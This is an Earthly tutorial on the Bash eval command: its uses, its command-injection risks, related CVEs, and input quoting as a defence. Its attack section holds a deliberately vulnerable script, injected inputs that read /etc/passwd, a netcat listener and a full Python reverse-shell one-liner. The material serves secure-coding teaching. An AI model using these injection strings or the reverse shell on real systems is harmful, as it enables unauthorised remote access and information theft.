---
title: "Bash eval: Understanding and (Safely) Using the Power of Dynamic Code Evaluation"
categories:
  - Tutorials
toc: true
author: Thinus Swart
editor: Mustapha Ahmad Ayodeji

internal-links:
 - understanding the power of dynamic code evaluation
 - using the power of dynamic code evaluation
 - what is dynamic code evaluation
 - power of dynamic code evaluation
 - how to use the power of dynamic code evaluation
excerpt: |
    This article explains the Bash `eval` command, its usage, risks, and vulnerabilities. It provides guidance on how to safely use `eval` by sanitizing user input and following best practices.
last_modified_at: 2023-10-06
---
**This article discusses the risks associated with using Bash eval. Advanced Bash users can use Earthly to simplify complex build tasks. [Check it out](https://cloud.earthly.dev/login).**

<div class="wide">
![Terminal window]({{site.images}}{{page.slug}}/EbrSrlX.png)
</div>

For developers diving into the world of Linux-based systems, understanding the command-line interface (CLI) and mastering Bash scripting is an essential skill set. While graphical user interfaces (GUIs) provide a familiar environment, the command line reigns supreme in terms of automation, system management, and streamlined development workflows.

As a developer, learning Bash offers tremendous advantages. For instance, it provides a versatile and efficient environment for executing commands, navigating file systems, manipulating data, and automating repetitive tasks. Whether you're working on a personal project, collaborating with a team, or managing servers in a production environment, Bash scripting can significantly streamline your workflow and enhance your productivity.

Bash has a ton of built-in commands that help you read, write, and navigate files, as well as perform more complex operations that are usually associated with proper programming languages. One of those built-in commands is the `eval` command.

In this guide, you'll learn all about the Bash `eval` command, including its risks and pitfalls, and how to mitigate them.

## What Is the Bash `eval` Statement?

The `eval` statement is a built-in command in Bash that allows you to dynamically evaluate and execute code that is either constructed or stored as a string.

The `eval` statement is frequently used when you need to generate and execute commands dynamically based on certain conditions or inputs. It enables you to construct complex commands on the fly, making use of variables, conditionals, loops, and other logic in the execution process.

## How the `eval` Statement Works

Take a look at a few `eval` examples to help you understand what's going on when you use it.

![examples]({{site.images}}{{page.slug}}/examples.png)\

### Basic `eval` Usage

To explore a basic `eval` example, run the following command in your terminal window:

~~~{.bash caption=">_"}
$ eval "echo Hello $USER!"
~~~

This will output the following:

~~~{ caption="Output"}
Hello thinus!
~~~

<figcaption>Print out your user name using `eval`.</figcaption>

In this example, the following occurs:

* You tell the `eval` statement that you want to output the word "Hello" as well as the name of the currently logged-in user, using the environment variable `$USER`.
* The `eval` statement evaluates the string, recognizes that it contains an environment variable called `$USER`, and retrieves the value for that variable.
* The output you receive confirms that it worked and your terminal window dutifully echoes "Hello thinus!" back to you.

> **Please note:** The username on this system is called `thinus`.

### Advanced Usage of `eval`

Because the `eval` statement evaluates and detects commands and other variables from the string, you can end up with the same `eval` commands having different values. For example, you might want to know what the day was exactly a week ago:

~~~{.bash caption=">_"}
$ lastweek='date --date="1 week ago"'
$ eval $lastweek
~~~

This will output the following:

~~~{ caption="Output"}
Thu 04 May 2023 23:15:38 SAST
~~~

Run the same command a few minutes later, and the time value of `$lastweek` increases by a bit more than a minute:

~~~{.bash caption=">_"}
$ eval $lastweek
~~~

This will output the following:

~~~{ caption="Output"}
Thu 04 May 2023 23:17:50 SAST
~~~

This is because the `eval` statement runs the command again, which, by default, returns the latest value of `date --date="1 week ago"`.

While this can be useful, it can also be dangerous, as you'll learn next.

## Risks of Using the `eval` Statement

![Risks]({{site.images}}{{page.slug}}/risk.png)\

While its dynamic nature is one of `eval`'s strengths, it also makes it a dangerous tool if you don't use it properly. Because it parses any string as a possible command, it can be abused to execute commands that aren't part of the original script or scheduled task.

Improper usage of the `eval` statement with untrusted input can lead to code injection attacks and other unintended consequences.

### Command Injection

Command injection is a security vulnerability where an attacker can execute unauthorized commands on a system by injecting malicious code into a vulnerable script or application.

Consider the following Bash script that asks a user for their name, reads their input, and prints the name out. You can save your own copy on your system as `hello.sh`:

~~~{.bash caption=">_"}
#!/bin/bash

# Ask the user for their name
echo Hello, who is this?

# Read the username from direct input
read name

# Welcome the user accordingly
output=(echo "Welcome user:" "$name")
eval "$(echo "${output[@]}")"
~~~

You might have to give the script execute permissions, and if you follow along with this example, it should work:

~~~{.bash caption=">_"}
$ chmod +x hello.sh
$ ./hello.sh
~~~

This will output the following:

~~~{ caption="Output"}
Hello, who is this?
LocalUser
Welcome user: LocalUser
~~~

While this example isn't particularly useful, it shows you how reading user input can be dangerous. Run the script again, but this time, change the input you're giving to the script to `LocalUser;date`:

~~~{.bash caption=">_"}
$ ./hello.sh 
~~~

This will output the following:

~~~{ caption="Output"}
Hello, who is this?
LocalUser;date
Welcome user: LocalUser
Sat 13 May 2023 00:54:16 SAST
~~~

As you can see, your welcome script allowed an attacker to read the date on your system! While this might sound harmless, a savvy attacker can use your script to gather information:

~~~{.bash caption=">_"}
$ ./hello.sh 
~~~

This will output the following:

~~~{ caption="Output"}
Hello, who is this?
LocalUser;cat /etc/passwd
Welcome user: LocalUser
<contents of /etc/passwd follows>
~~~

Now the attacker has a list of all the users on your system, and they can start looking for information to execute a privilege escalation attack (more on this next).

### Gaining Persistence

As you saw in the previous example, command injection is a serious risk when you use the `eval` statement in your Bash scripts. The same command injection method can be used by an attacker to gain a foothold on your server by exploiting vulnerabilities in other commands they're accessing via your insecure script. Your script could even be running as the root user already, in which case, the attacker can pretty much do anything they want like gaining persistence on your server.

"Gaining Persistence" refers to a malicious actor's ability to maintain their foothold or presence within a compromised system or network over an extended period of time.

To achieve this, an attacker can use your vulnerable script to create a [reverse shell](https://www.imperva.com/learn/application-security/reverse-shell/). Note that this method may differ slightly depending on the Linux distribution that's being targeted and the availability of default tools like [Python](https://www.python.org) or [Perl](https://www.perl.org) on the vulnerable box.

First, the attacker sets up a listening port on their attack box using `[netcat](https://nmap.org/ncat/)`:

~~~{.bash caption=">_"}
$ nc -lvp 4444
~~~

This will output the following:

~~~{ caption="Output"}
Listening on 0.0.0.0 4444
~~~

Then they use the `eval` in your `hello.sh` script to connect to their listening port, effectively giving themselves a shell on your vulnerable system:

~~~{.bash caption=">_"}
user@localhost:$ ./hello.sh
Hello, who is this?
LocalUser;export RHOST="localhost";export RPORT=4444;python3 -c \
'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),\
int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];\
pty.spawn("/bin/sh")'
Welcome user: User

~~~

Now, from the attacker's box, you can execute normal shell commands directly on the victim's box:

~~~{.bash caption=">_"}
Connection received on localhost 47004
$ ls
ls
hello.sh
$
$ whoami
whoami
user
~~~

> Note: In this example, you're effectively connecting to the same box, but if network connectivity is available, nothing stops the attacker from doing this over the internet.

Now that the attacker has a foothold, they can try to perform reconnaissance and privilege escalation techniques.

### Other Unexpected Behavior

Even if an attacker can't find your script, it's still a good idea to sanitize any input for any script that accepts user input. You may not experience malicious behavior, but you could still experience your script breaking or data being corrupted by bad user input.

For example, your script might be capturing user responses in a database. If you're not making sure that the data being entered fits the field type you are targeting, you could be receiving the incorrect data in your database, making the data capturing effectively useless.

## Real-World Vulnerabilities Caused by `eval`

![Vulnerabilities]({{site.images}}{{page.slug}}/vulnerabilities.png)\

Software vulnerabilities are found in software on a daily basis. There is a continuous process to find and fix vulnerabilities, especially in open-source software. Here are a few examples where vulnerabilities were caused by the `eval` command.

In 2021, a [CVE](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures) was issued for [Gradle](https://gradle.org), a popular application build tool that helps developers to automate the build pipeline of their application.

[CVE-2021-32751](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32751) was issued to warn users that specific scripts in Gradle v7.2 were vulnerable to [arbitrary code execution](https://en.wikipedia.org/wiki/Arbitrary_code_execution) enabled by the `eval` command in those scripts. The advisory warned users to either upgrade to the latest version of Gradle, which fixes the vulnerability, or to manually edit the scripts to remove the use of `eval` in the scripts.

Vulnerabilities caused by `eval` have even been published in documentation.

The [Advanced Bash Scripting Guide](https://tldp.org/LDP/abs/html/) hosted on [The Linux Documentation Project](https://tldp.org) contains a function called [`getopt_simple`](https://tldp.org/LDP/abs/html/string-manipulation.html#GETOPTSIMPLE). This function has an unsanitized `eval` that would allow an attacker at arbitrarily execute commands just by specifying a command via a command line argument.

This vulnerability was discovered by [RedTeam Pentesting](https://www.redteam-pentesting.de/en/advisories/rt-sa-2019-007/-code-execution-via-insecure-shell-function-getopt-simple) and [CVE-2019-9891](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9891) was issued for it.

## How To Safely Use `eval`

The safest way to use `eval` is not use it at all. The example we've been using so far could easily be written without `eval`. But sometimes `eval` is needed and then you need to sanitize user input.

One of the easiest ways to sanitize user input is to make sure that all the different parts of the input (also called tokens) are quoted.

You can write a quote function that your script can use to make sure all the parts of the input have quotes. For instance, modify our `hello.sh` script accordingly:

~~~{.bash caption=">_"}
#!/bin/bash

# create a token quote function to clean up user 
# inputs and make sure they have quotes
function token_quotes {
  local quoted=()
  for token; do
    quoted+=( "$(printf '%q' "$token")" )
  done
  printf '%s\n' "${quoted[*]}"
}

# Ask the user for their name
echo Hello, who is this?

# Read the username from direct input
read name

# Welcome the user accordingly
output=(echo "Welcome user:" "$name")
# don't blindly echo, rather run it through the tokenizer
eval "$(token_quotes "${output[@]}")"
~~~

Now, try to hack yourself again:

~~~{.bash caption=">_"}
$ ./hello.sh 
~~~

Output:

~~~{ caption="Output"}
Hello, who is this?
LocalUser;date
Welcome user: LocalUser;date
~~~

Because the `date` part of the input is now enclosed in quotes, the `eval` command in your script is outputting it as a string and not running it as a command.

## Other Ways to Mitigate Attacks

The token quote function is perhaps the easiest way to clean up user inputs and to make sure you don't accidentally execute unwanted commands on your system.

If, however, you need to use the `eval` statement in your scripts, try to keep the following suggestions in mind:

* **Validate user input:** It's one thing to sanitize the input, but you should validate it as well. If input data is expected to be in a specific format, like a date, then make sure the input looks like a date before accepting it.
* **Run your script with least privilege:** Don't run your script as root if you don't need to. Running your script in a sandbox environment with access only to the files and commands that it specifically needs is better. If your script then gets compromised and/or abused, you might be able to mitigate the damage that a bad actor can cause.
* **If you aren't executing commands, enclose your variable values in single quotes:** According to the Bash manual, [single quotes](https://www.gnu.org/software/bash/manual/html_node/Single-Quotes.html) preserve the literal string value inside the quotes. Only use double quotes if you want command substitution or variable expansion to occur.

## Conclusion

Bash is a powerful tool for scripting, programming, and automating different tasks on any Linux desktop or server, and with the power of `eval`, it can be even more powerful. In this article, you learned the following:

* `eval` can be a powerful tool to help make your Bash scripts do more.
* `eval` can also be dangerous if you aren't careful.
* User input should always be validated and sanitized.
* Single quotes should be used rather than double quotes if you're just storing variables.

As long as you keep security in mind, you should be good to go!

{% include_html cta/bottom-cta.html %}
